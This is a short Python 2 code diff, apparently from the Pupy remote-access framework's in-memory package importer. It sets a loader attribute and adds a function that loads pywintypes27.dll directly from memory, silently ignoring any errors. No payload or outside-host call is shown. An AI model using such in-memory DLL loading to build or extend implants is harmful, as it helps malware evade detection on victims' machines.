@@ -54,7 +54,7 @@ class PupyPackageLoader:
 		self.extension = extension
 		self.is_pkg=is_pkg
 		self.path=path
-		#self.archive=""
+		self.archive="" #need this attribute
 
 	def load_module(self, fullname):
 		imp.acquire_lock()
@@ -159,7 +159,18 @@ class PupyPackageFinder:
 		finally:
 			imp.release_lock()
 
+def load_pywintypes():
+	#loading pywintypes27.dll :-)
+	global modules
+	try:
+		import pupy
+		pupy.load_dll("pywintypes27.dll", modules["pywintypes27.dll"])
+	except Exception as e:
+		print e
+		pass
+
 def install():
 	sys.meta_path.append(PupyPackageFinder(modules))
 	sys.path_importer_cache.clear()
+
 
